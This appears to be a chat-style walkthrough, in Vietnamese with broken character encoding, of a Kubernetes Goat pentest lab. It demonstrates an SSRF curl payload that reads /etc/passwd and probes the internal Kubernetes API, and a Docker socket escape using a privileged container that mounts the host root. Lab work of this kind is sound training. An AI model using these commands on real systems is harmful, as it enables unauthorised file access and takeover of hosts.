Tuyá»‡t vá»i. BÃ¢y giá» mÃ´i trÆ°á»ng Ä‘Ã£ thÃ´ng suá»‘t: Kali (Attacker) --> Ubuntu (Server) --> Kubernetes Goat (Victim).

ChÃºng ta sáº½ báº¯t Ä‘áº§u "Pentest" thá»±c sá»±. VÃ¬ K8s Goat lÃ  má»™t "bÃ£i táº­p" vá»›i nhiá»u bÃ i khÃ¡c nhau, tÃ´i sáº½ hÆ°á»›ng dáº«n báº¡n khai thÃ¡c 2 lá»— há»•ng kinh Ä‘iá»ƒn vÃ  thÃº vá»‹ nháº¥t trong mÃ´i trÆ°á»ng Kubernetes: SSRF vÃ  Docker Escape.
Ká»‹ch báº£n 1: SSRF (Server Side Request Forgery)

Má»¥c tiÃªu: Lá»£i dá»¥ng á»©ng dá»¥ng web bá»‹ lá»—i Ä‘á»ƒ Ä‘á»c file máº­t cá»§a há»‡ thá»‘ng hoáº·c quÃ©t máº¡ng ná»™i bá»™ K8s mÃ  ngÆ°á»i ngoÃ i khÃ´ng tháº¥y Ä‘Æ°á»£c.

BÆ°á»›c 1: Truy cáº­p vÃ o bÃ i táº­p

    TrÃªn mÃ¡y Kali, má»Ÿ Firefox truy cáº­p http://<IP_UBUNTU>:1234

    Chá»n bÃ i: "Internal Proxy" (hoáº·c SSRF).

BÆ°á»›c 2: PhÃ¢n tÃ­ch á»¨ng dá»¥ng nÃ y cÃ³ má»™t Ã´ nháº­p liá»‡u Ä‘á»ƒ kiá»ƒm tra URL.

    Náº¿u báº¡n nháº­p https://google.com -> Server K8s sáº½ Ä‘i ra Google láº¥y dá»¯ liá»‡u vá» hiá»ƒn thá»‹ cho báº¡n.

    TÆ° duy Hacker: "Náº¿u mÃ¬nh báº£o nÃ³ Ä‘i láº¥y dá»¯ liá»‡u tá»« chÃ­nh nÃ³ (localhost) hoáº·c file há»‡ thá»‘ng thÃ¬ sao?"

BÆ°á»›c 3: Khai thÃ¡c (Exploit) tá»« Kali Má»Ÿ Terminal Kali vÃ  dÃ¹ng curl Ä‘á»ƒ gá»­i payload Ä‘á»™c háº¡i:

A. Äá»c file máº­t /etc/passwd
Bash

# Thay IP_UBUNTU báº±ng IP tháº­t
curl "http://<IP_UBUNTU>:1234/internal-proxy?url=file:///etc/passwd"

ğŸ‘‰ Káº¿t quáº£: Náº¿u báº¡n tháº¥y danh sÃ¡ch user (root, bin, daemon...) hiá»‡n ra -> ThÃ nh cÃ´ng! Báº¡n Ä‘Ã£ Ä‘á»c Ä‘Æ°á»£c file há»‡ thá»‘ng cá»§a cÃ¡i Container Ä‘Ã³.

B. "Chá»c" vÃ o Metadata Service (Level cao hÆ¡n) Trong mÃ´i trÆ°á»ng Cloud (AWS/GCP), Ä‘á»‹a chá»‰ 169.254.169.254 chá»©a khÃ³a bÃ­ máº­t. Trong K8s, chÃºng ta thÆ°á»ng nháº¯m vÃ o API Server ná»™i bá»™. Thá»­ quÃ©t xem Container nÃ y cÃ³ truy cáº­p Ä‘Æ°á»£c API K8s khÃ´ng:
Bash

curl "http://<IP_UBUNTU>:1234/internal-proxy?url=https://kubernetes.default"

ğŸ‘‰ Náº¿u nÃ³ tráº£ vá» JSON thÃ´ng tin API -> Bingo! Tá»« Ä‘Ã¢y hacker cÃ³ thá»ƒ dÃ¹ng token cá»§a Pod Ä‘á»ƒ Ä‘iá»u khiá»ƒn cá»¥m K8s.
Ká»‹ch báº£n 2: Container Escape (ThoÃ¡t ngá»¥c - DIND)

Má»¥c tiÃªu: ÄÃ¢y lÃ  ká»¹ thuáº­t "ngáº§u" nháº¥t. Báº¡n Ä‘ang bá»‹ nhá»‘t trong 1 cÃ¡i há»™p (Container), báº¡n sáº½ hack Ä‘á»ƒ thoÃ¡t ra ngoÃ i vÃ  chiáº¿m quyá»n mÃ¡y chá»§ (Node/Ubuntu).

BÆ°á»›c 1: TÃ¬m bÃ i táº­p TrÃªn giao diá»‡n Web, tÃ¬m bÃ i "Docker in Docker" (DIND). (Náº¿u khÃ´ng tháº¥y trÃªn web, báº¡n cÃ³ thá»ƒ thá»±c hiá»‡n tháº³ng thÃ´ng qua Terminal báº±ng cÃ¡ch chui vÃ o pod Ä‘Ã³).

BÆ°á»›c 2: XÃ¢m nháº­p vÃ o Pod (Giáº£ láº­p Ä‘Ã£ chiáº¿m Ä‘Æ°á»£c Shell) Giáº£ sá»­ thÃ´ng qua lá»— há»•ng Web nÃ o Ä‘Ã³, báº¡n Ä‘Ã£ má»Ÿ Ä‘Æ°á»£c terminal vÃ o trong Pod nÃ y. TrÃªn mÃ¡y Ubuntu, hÃ£y cháº¡y lá»‡nh nÃ y Ä‘á»ƒ "chui" vÃ o trong:
Bash

# TÃ¬m tÃªn pod DIND
kubectl get pods

# Chui vÃ o (Thay tÃªn pod cho Ä‘Ãºng)
kubectl exec -it <tÃªn-pod-dind-xxxxx> -- /bin/bash

BÆ°á»›c 3: Kiá»ƒm tra "VÅ© khÃ­" Khi Ä‘Ã£ á»Ÿ trong container, hÃ£y kiá»ƒm tra xem báº¡n cÃ³ quyá»n truy cáº­p vÃ o Docker Socket cá»§a mÃ¡y chá»§ khÃ´ng. ÄÃ¢y lÃ  lá»—i cáº¥u hÃ¬nh cá»±c ká»³ nguy hiá»ƒm.
Bash

ls -la /var/run/docker.sock

ğŸ‘‰ Náº¿u tháº¥y file nÃ y tá»“n táº¡i -> XONG PHIM! Báº¡n Ä‘Ã£ náº¯m trÃ¹m.

BÆ°á»›c 4: Thá»±c hiá»‡n Escape (Chiáº¿m quyá»n Host) VÃ¬ container nÃ y thÃ´ng Ä‘Æ°á»£c vá»›i Docker cá»§a mÃ¡y chá»§, báº¡n cÃ³ thá»ƒ ra lá»‡nh cho mÃ¡y chá»§ táº¡o má»™t container má»›i vÃ  mount toÃ n bá»™ á»• cá»©ng cá»§a mÃ¡y chá»§ vÃ o Ä‘Ã³.

GÃµ lá»‡nh sau (Ngay bÃªn trong container):
Bash

# Lá»‡nh nÃ y dÃ¹ng client docker bÃªn trong Ä‘á»ƒ Ä‘iá»u khiá»ƒn daemon bÃªn ngoÃ i
docker run -it --rm -v /:/host --privileged ubuntu chroot /host

Giáº£i thÃ­ch lá»‡nh:

    docker run: Táº¡o container má»›i.

    -v /:/host: Mount thÆ° má»¥c gá»‘c / (toÃ n bá»™ á»• cá»©ng mÃ¡y tháº­t) vÃ o thÆ° má»¥c /host cá»§a container giáº£.

    --privileged: Cháº¡y vá»›i quyá»n tá»‘i cao.

    chroot /host: Chuyá»ƒn gá»‘c thÆ° má»¥c lÃ m viá»‡c sang /host.

ğŸ‘‰ Káº¿t quáº£: Sau khi Enter, báº¡n Ä‘ang Ä‘á»©ng á»Ÿ dáº¥u nháº¯c lá»‡nh #. Thá»­ gÃµ ls /home. Náº¿u báº¡n tháº¥y thÆ° má»¥c user cá»§a mÃ¡y Ubuntu tháº­t -> ChÃºc má»«ng, báº¡n Ä‘Ã£ thoÃ¡t ngá»¥c thÃ nh cÃ´ng vÃ  Ä‘ang Ä‘iá»u khiá»ƒn mÃ¡y chá»§ Ubuntu!
Tá»•ng káº¿t bÃ i Pentest

    Recon: DÃ¹ng Nmap/Browser quÃ©t cá»•ng (Ä‘Ã£ lÃ m).

    Weaponization: TÃ¬m lá»— há»•ng Web (SSRF).

    Exploitation: Äá»c file há»‡ thá»‘ng.

    Lateral Movement / Escape: Tá»« trong container nháº£y ra ngoÃ i chiáº¿m quyá»n root cá»§a Node.

Báº¡n hÃ£y thá»­ lÃ m Ká»‹ch báº£n 1 tá»« mÃ¡y Kali xem cÃ³ Ä‘á»c Ä‘Æ°á»£c file /etc/passwd khÃ´ng nhÃ©!
